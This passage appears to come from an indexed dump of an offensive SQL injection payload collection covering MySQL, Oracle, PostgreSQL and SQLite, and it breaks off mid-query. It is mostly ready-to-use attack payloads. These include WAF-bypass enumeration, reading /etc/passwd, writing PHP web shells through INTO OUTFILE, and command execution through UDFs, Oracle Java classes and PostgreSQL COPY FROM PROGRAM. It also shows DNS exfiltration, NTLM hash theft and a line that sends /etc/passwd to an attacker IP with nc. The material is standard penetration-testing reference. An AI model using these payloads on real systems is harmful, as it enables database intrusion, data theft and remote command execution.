WAF\n+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+\n-- sharik\n(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-current-queries","title":"MYSQL Current queries","text":"<p>This table can list all operations that DB is performing at the moment.</p> <pre><code>union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #\n-- Dump in one shot example for the table content.\nunion select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-read-content-of-a-file","title":"MYSQL Read content of a file","text":"<p>Need the <code>filepriv</code>, otherwise you will get the error : <code>ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code></p> <pre><code>' UNION ALL SELECT LOAD_FILE('/etc/passwd') --\n</code></pre> <pre><code>UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));\n</code></pre> <p>If you are <code>root</code> on the database, you can re-enable the <code>LOAD_FILE</code> using the following query</p> <pre><code>GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-write-a-shell","title":"MYSQL Write a shell","text":""},{"location":"SQL%20Injection/MySQL%20Injection/#into-outfile-method","title":"Into outfile method","text":"<pre><code>[...] UNION SELECT \"&lt;?php system($_GET['cmd']); ?&gt;\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"\n[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '&lt;?php phpinfo();?&gt;'\n[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -\n[...] union all select 1,2,3,4,\"&lt;?php echo shell_exec($_GET['cmd']);?&gt;\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#into-dumpfile-method","title":"Into dumpfile method","text":"<pre><code>[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'\n[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-truncation","title":"MYSQL Truncation","text":"<p>In MYSQL \"<code>admin</code>\" and \"<code>admin</code>\" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.</p> <pre><code>`username` varchar(20) not null\n</code></pre> <p>Payload: <code>username = \"admin               a\"</code></p>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-fast-exploitation","title":"MYSQL Fast Exploitation","text":"<p>Requirement: <code>MySQL &gt;= 5.7.22</code></p> <p>Use <code>json_arrayagg()</code> instead of <code>group_concat()</code> which allows less symbols to be displayed * group_concat() = 1024 symbols * json_arrayagg() &gt; 16,000,000 symbols</p> <pre><code>SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-udf-command-execution","title":"MYSQL UDF command execution","text":"<p>First you need to check if the UDF are installed on the server.</p> <pre><code>$ whereis lib_mysqludf_sys.so\n/usr/lib/lib_mysqludf_sys.so\n</code></pre> <p>Then you can use functions such as <code>sys_exec</code> and <code>sys_eval</code>.</p> <pre><code>$ mysql -u root -p mysql\nEnter password: [...]\nmysql&gt; SELECT sys_eval('id');\n+--------------------------------------------------+\n| sys_eval('id') |\n+--------------------------------------------------+\n| uid=118(mysql) gid=128(mysql) groups=128(mysql) |\n+--------------------------------------------------+\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#mysql-out-of-band","title":"MYSQL Out of band","text":"<pre><code>select @@version into outfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt';\nselect @@version into dumpfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#dns-exfiltration","title":"DNS exfiltration","text":"<pre><code>select load_file(concat('\\\\\\\\',version(),'.hacker.site\\\\a.txt'));\nselect load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#unc-path-ntlm-hash-stealing","title":"UNC Path - NTLM hash stealing","text":"<pre><code>select load_file('\\\\\\\\error\\\\abc');\nselect load_file(0x5c5c5c5c6572726f725c5c616263);\nselect 'osanda' into dumpfile '\\\\\\\\error\\\\abc';\nselect 'osanda' into outfile '\\\\\\\\error\\\\abc';\nload data infile '\\\\\\\\error\\\\abc' into table database.table_name;\n</code></pre>"},{"location":"SQL%20Injection/MySQL%20Injection/#references","title":"References","text":"<ul> <li>MySQL Out of Band Hacking - @OsandaMalith</li> <li>[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148</li> <li>Help \u043f\u043e MySql \u0438\u043d\u044a\u0435\u043a\u0446\u0438\u044f\u043c - rdot.org</li> <li>SQL Truncation Attack - Warlock</li> <li>HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman</li> <li>SQL Wiki - netspi</li> <li>ekoparty web_100 - 2016/10/26 - p4-team</li> <li>Websec - MySQL - Roberto Salgado - May 29, 2013.</li> </ul>"},{"location":"SQL%20Injection/OracleSQL%20Injection/","title":"Oracle SQL Injection","text":""},{"location":"SQL%20Injection/OracleSQL%20Injection/#summary","title":"Summary","text":"<ul> <li>Oracle SQL version</li> <li>Oracle SQL database name</li> <li>Oracle SQL List databases</li> <li>Oracle SQL List columns</li> <li>Oracle SQL List tables</li> <li>Oracle SQL Error Based</li> <li>Oracle SQL Blind</li> <li>Oracle SQL Time Based</li> <li>Oracle SQL Command execution</li> <li>References</li> </ul>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-version","title":"Oracle SQL version","text":"<pre><code>SELECT user FROM dual UNION SELECT * FROM v$version\n</code></pre>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-database-name","title":"Oracle SQL database name","text":"<pre><code>SELECT global_name FROM global_name;\nSELECT name FROM V$DATABASE;\nSELECT instance_name FROM V$INSTANCE;\nSELECT SYS.DATABASE_NAME FROM DUAL;\n</code></pre>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-list-databases","title":"Oracle SQL List Databases","text":"<pre><code>SELECT DISTINCT owner FROM all_tables;\n</code></pre>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-list-columns","title":"Oracle SQL List Columns","text":"<pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';\nSELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';\n</code></pre>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-list-tables","title":"Oracle SQL List Tables","text":"<pre><code>SELECT table_name FROM all_tables;\nSELECT owner, table_name FROM all_tables;\nSELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';\n</code></pre>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-error-based","title":"Oracle SQL Error based","text":"Description Query Invalid HTTP Request SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual CTXSYS.DRITHSX.SN SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual Invalid XPath SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual Invalid XML SELECT to_char(dbms_xmlgen.getxml('select \"'||(select user from sys.dual)||'\" FROM sys.dual')) FROM dual Invalid XML SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username || ',')),'/s').getstringval(),',') FROM all_users SQL Error SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-blind","title":"Oracle SQL Blind","text":"Description Query Version is 12.2 SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; Subselect is enabled SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) Table log_table exists SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); Column message exists in table log_table SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; First letter of first message is t SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-time-based","title":"Oracle SQL Time based","text":"<pre><code>AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                 comment:   -- /**/\n</code></pre>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-sql-command-execution","title":"Oracle SQL Command Execution","text":"<ul> <li>ODAT (Oracle Database Attacking Tool)</li> </ul>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-java-execution","title":"Oracle Java Execution","text":"<ul> <li>List Java privileges     <pre><code>select * from dba_java_policy\nselect * from user_java_policy\n</code></pre></li> <li>Grant privileges     <pre><code>exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','&lt;&lt;ALL FILES&gt;&gt;','execute');\nexec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');\nexec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');\n</code></pre></li> <li>Execute commands<ul> <li>10g R2, 11g R1 and R2: <code>DBMS_JAVA_TEST.FUNCALL()</code> <pre><code>SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir &gt;c:\\test.txt') FROM DUAL\nSELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls&gt;/tmp/OUT2.LST') from dual\n</code></pre></li> <li>11g R1 and R2: <code>DBMS_JAVA.RUNJAVA()</code> <pre><code>SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST') FROM DUAL\n</code></pre></li> </ul> </li> </ul>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#oracle-java-class","title":"Oracle Java Class","text":"<pre><code>/* create Java class */\nBEGIN\nEXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';\nEND;\n/\nBEGIN\nEXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';\nEND;\n/\n/* run OS command */\nSELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;\n</code></pre> <p>or (hex encoded)</p> <pre><code>/* create Java class */\nSELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));\nEXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual\n/* run OS command */\nSELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;\n</code></pre>"},{"location":"SQL%20Injection/OracleSQL%20Injection/#references","title":"References","text":"<ul> <li>NetSpi - SQL Wiki</li> <li>ASDC12 - New and Improved Hacking Oracle From Web</li> <li>Pentesting Oracle TNS Listener - HackTricks</li> <li>ODAT: Oracle Database Attacking Tool</li> </ul>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/","title":"PostgreSQL injection","text":""},{"location":"SQL%20Injection/PostgreSQL%20Injection/#summary","title":"Summary","text":"<ul> <li>PostgreSQL Comments</li> <li>PostgreSQL version</li> <li>PostgreSQL Current User</li> <li>PostgreSQL List Users</li> <li>PostgreSQL List Password Hashes</li> <li>PostgreSQL List Database Administrator Accounts</li> <li>PostgreSQL List Privileges</li> <li>PostgreSQL Check if Current User is Superuser</li> <li>PostgreSQL database name</li> <li>PostgreSQL List databases</li> <li>PostgreSQL List tables</li> <li>PostgreSQL List columns</li> <li>PostgreSQL Error Based</li> <li>PostgreSQL XML Helpers</li> <li>PostgreSQL Blind</li> <li>PostgreSQL Time Based</li> <li>PostgreSQL Stacked query</li> <li>PostgreSQL File Read</li> <li>PostgreSQL File Write</li> <li>PostgreSQL Command execution<ul> <li>CVE-2019\u20139193</li> <li>Using libc.so.6</li> </ul> </li> <li>Bypass Filter</li> <li>References</li> </ul>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-comments","title":"PostgreSQL Comments","text":"<pre><code>--\n/**/  </code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-chain-injection-points-symbols","title":"PostgreSQL chain injection points symbols","text":"<pre><code>; #Used to terminate a SQL command. The only place it can be used within a statement is within a string constant or quoted identifier.\n|| #or statement # usage examples: /?whatever=1;(select 1 from pg_sleep(5))\n/?whatever=1||(select 1 from pg_sleep(5))\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-version","title":"PostgreSQL Version","text":"<pre><code>SELECT version()\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-current-user","title":"PostgreSQL Current User","text":"<pre><code>SELECT user;\nSELECT current_user;\nSELECT session_user;\nSELECT usename FROM pg_user;\nSELECT getpgusername();\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-users","title":"PostgreSQL List Users","text":"<pre><code>SELECT usename FROM pg_user\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-password-hashes","title":"PostgreSQL List Password Hashes","text":"<pre><code>SELECT usename, passwd FROM pg_shadow </code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-database-administrator-accounts","title":"PostgreSQL List Database Administrator Accounts","text":"<pre><code>SELECT usename FROM pg_user WHERE usesuper IS TRUE\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-privileges","title":"PostgreSQL List Privileges","text":"<pre><code>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-check-if-current-user-is-superuser","title":"PostgreSQL Check if Current User is Superuser","text":"<pre><code>SHOW is_superuser; SELECT current_setting('is_superuser');\nSELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-database-name","title":"PostgreSQL Database Name","text":"<pre><code>SELECT current_database()\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-database","title":"PostgreSQL List Database","text":"<pre><code>SELECT datname FROM pg_database\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-tables","title":"PostgreSQL List Tables","text":"<pre><code>SELECT table_name FROM information_schema.tables\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-list-columns","title":"PostgreSQL List Columns","text":"<pre><code>SELECT column_name FROM information_schema.columns WHERE table_name='data_table'\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-error-based","title":"PostgreSQL Error Based","text":"<pre><code>,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)\n,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--\n,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--\n,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)\n' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1\n' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-xml-helpers","title":"PostgreSQL XML helpers","text":"<pre><code>select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row\n</code></pre> <p>The <code>query_to_xml</code> above returns all the results of the specified query as a single result. Chain this with the PostgreSQL Error Based technique to exfiltrate data without having to worry about <code>LIMIT</code>ing your query to one result.</p> <pre><code>select database_to_xml(true,true,''); -- dump the current database to XML\nselect database_to_xmlschema(true,true,''); -- dump the current db to an XML schema\n</code></pre> <p>Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.</p>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-blind","title":"PostgreSQL Blind","text":"<pre><code>' and substr(version(),1,10) = 'PostgreSQL' and '1  -&gt; OK\n' and substr(version(),1,10) = 'PostgreXXX' and '1  -&gt; KO\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-time-based","title":"PostgreSQL Time Based","text":""},{"location":"SQL%20Injection/PostgreSQL%20Injection/#identify-time-based","title":"Identify time based","text":"<pre><code>select 1 from pg_sleep(5)\n;(select 1 from pg_sleep(5))\n||(select 1 from pg_sleep(5))\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#database-dump-time-based","title":"Database dump time based","text":"<pre><code>select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#table-dump-time-based","title":"Table dump time based","text":"<pre><code>select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#columns-dump-time-based","title":"columns dump time based","text":"<pre><code>select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1\n</code></pre> <pre><code>AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))\nAND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-stacked-query","title":"PostgreSQL Stacked Query","text":"<p>Use a semi-colon \";\" to add another query</p> <pre><code>http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-file-read","title":"PostgreSQL File Read","text":"<pre><code>select pg_ls_dir('./');\nselect pg_read_file('PG_VERSION', 0, 200);\n</code></pre> <p>NOTE: Earlier versions of Postgres did not accept absolute paths in <code>pg_read_file</code> or <code>pg_ls_dir</code>. Newer versions (as of this commit) will allow reading any file/filepath for super users or users in the <code>default_role_read_server_files</code> group.</p> <pre><code>CREATE TABLE temp(t TEXT);\nCOPY temp FROM '/etc/passwd';\nSELECT * FROM temp limit 1 offset 0;\n</code></pre> <pre><code>SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID\nSELECT lo_get(16420); -- use the OID returned from the above\nSELECT * from pg_largeobject; -- or just get all the large objects and their data\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-file-write","title":"PostgreSQL File Write","text":"<pre><code>CREATE TABLE pentestlab (t TEXT);\nINSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');\nSELECT * FROM pentestlab;\nCOPY pentestlab(t) TO '/tmp/pentestlab';\n</code></pre> <p>Or as one line: <pre><code>COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';\n</code></pre></p> <pre><code>SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data\nSELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20\nSELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#postgresql-command-execution","title":"PostgreSQL Command execution","text":""},{"location":"SQL%20Injection/PostgreSQL%20Injection/#cve-20199193","title":"CVE-2019\u20139193","text":"<p>Can be used from Metasploit if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. </p> <pre><code>DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists\nCREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output\nCOPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function\nSELECT * FROM cmd_exec;                 -- [Optional] View the results\nDROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table\n</code></pre> <p></p>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#using-libcso6","title":"Using libc.so.6","text":"<pre><code>CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;\nSELECT system('cat /etc/passwd | nc &lt;attacker IP&gt; &lt;attacker port&gt;');\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#bypass-filter","title":"Bypass Filter","text":""},{"location":"SQL%20Injection/PostgreSQL%20Injection/#quotes","title":"Quotes","text":"<p>Using CHR</p> <pre><code>SELECT CHR(65)||CHR(66)||CHR(67);\n</code></pre> <p>Using Dollar-signs  ( &gt;= version 8 PostgreSQL)</p> <pre><code>SELECT $$This is a string$$\nSELECT $TAG$This is another string$TAG$\n</code></pre>"},{"location":"SQL%20Injection/PostgreSQL%20Injection/#references","title":"References","text":"<ul> <li>A Penetration Tester\u2019s Guide to PostgreSQL - David Hayter</li> <li>Authenticated Arbitrary Command Execution on PostgreSQL 9.3 &gt; Latest - Mar 20 2019 - GreenWolf</li> <li>SQL Injection /webApp/oma_conf ctx parameter (viestinta.lahitapiola.fi) - December 8, 2016 - Sergey Bobrov (bobrov)</li> <li>POSTGRESQL 9.X REMOTE COMMAND EXECUTION - 26 Oct 17 - Daniel</li> <li>SQL Injection and Postgres - An Adventure to Eventual RCE - May 05, 2020 - Denis Andzakovic</li> <li>Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - 2009 - INFIGO</li> </ul>"},{"location":"SQL%20Injection/SQLite%20Injection/","title":"SQLite Injection","text":""},{"location":"SQL%20Injection/SQLite%20Injection/#summary","title":"Summary","text":"<ul> <li>SQLite comments</li> <li>SQLite version</li> <li>String based - Extract database structure</li> <li>Integer/String based - Extract table name</li> <li>Integer/String based - Extract column name</li> <li>Boolean - Count number of tables</li> <li>Boolean - Enumerating table name</li> <li>Boolean - Extract info</li> <li>Boolean - Error based</li> <li>Time based</li> <li>Remote Command Execution using SQLite command - Attach Database</li> <li>Remote Command Execution using SQLite command - Load_extension</li> <li>References</li> </ul>"},{"location":"SQL%20Injection/SQLite%20Injection/#sqlite-comments","title":"SQLite comments","text":"<pre><code>--\n/**/\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#sqlite-version","title":"SQLite version","text":"<pre><code>select sqlite_version();\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#string-based-extract-database-structure","title":"String based - Extract database structure","text":"<pre><code>SELECT sql FROM sqlite_schema\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#integerstring-based-extract-table-name","title":"Integer/String based - Extract table name","text":"<pre><code>SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'\n</code></pre> <p>Use limit X+1 offset X, to extract all tables.</p>"},{"location":"SQL%20Injection/SQLite%20Injection/#integerstring-based-extract-column-name","title":"Integer/String based - Extract column name","text":"<pre><code>SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'\n</code></pre> <p>For a clean output</p> <pre><code>SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),\"TEXT\",''),\"INTEGER\",''),\"AUTOINCREMENT\",''),\"PRIMARY KEY\",''),\"UNIQUE\",''),\"NUMERIC\",''),\"REAL\",''),\"BLOB\",''),\"NOT NULL\",''),\",\",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'\n</code></pre>"},{"location":"SQL%20Injection/SQLite%20Injection/#boolean-count-number-of-tables","title":"Boolean - Count number of tables","text":"<pre><code>and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 